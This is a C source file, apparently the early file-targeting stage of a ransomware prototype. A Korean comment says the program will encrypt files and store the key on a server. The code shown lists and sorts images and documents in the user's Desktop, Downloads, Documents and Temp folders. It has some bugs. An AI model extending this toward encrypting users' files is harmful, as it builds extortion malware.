#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <locale.h>
#include <time.h>
#include "files.h"

// 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.


int main() {

    _wsetlocale(LC_ALL, L"Korean" );
    wchar_t* dirPrefix; 
    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
    wcscpy(dirPrefix, L"C:\\Users\\");
    wchar_t *userName = getUserName();
    wcscat(dirPrefix, userName);
    wcscat(dirPrefix, L"\\test_folder");

    struct FILEDIR fileDir;
    struct FILES files;
    files.doc_index, files.docx_index, files.jpg_index, files.png_index, files.txt_index = 0;


    // TODO : wcscat -> wcscpy 로 변경 
    // TODO : classify 에 경로 넣어주기


    //[1] Desktop
    wchar_t* dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscpy(dir, dirPrefix);
    wcscat(dir, DESKTOP_DIR);
    getDirectoryFileList(dir, fileDir.desktop);
    classifyFiles(&files, dir, fileDir.desktop);

    //[2] Downloads
    wcscpy(dir, dirPrefix);
    wcscat(dir, DOWNLOADS_DIR);
    getDirectoryFileList(dir, fileDir.downloads);
    classifyFiles(&files, dir, fileDir.downloads);

    // [3]  Documents
    wcscpy(dir, dirPrefix);
    wcscat(dir, DOCUMENTS_DIR);
    getDirectoryFileList(dir, fileDir.documents);
    classifyFiles(&files, dir, fileDir.documents);

    // [4]  AppData/Local/Temp
    wcscpy(dir, dirPrefix);
    wcscat(dir, APPDATA_DIR);
    getDirectoryFileList(dir, fileDir.appData);
    classifyFiles(&files, dir, fileDir.appData);


    for(int i = 0; i < files.jpg_index; i++) 
        wprintf(L"\n jpg fileList[%d] : %s \n", i, files.jpg[i]);
    for(int i = 0; i < files.png_index; i++) 
        wprintf(L"\n png fileList[%d] : %s \n", i, files.png[i]);
    for(int i = 0; i < files.doc_index; i++) 
        wprintf(L"\n doc fileList[%d] : %s \n", i, files.doc[i]);
    for(int i = 0; i < files.docx_index; i++) 
        wprintf(L"\n docx fileList[%d] : %s \n", i, files.docx[i]);


    free(dir);
    free(dirPrefix);
}



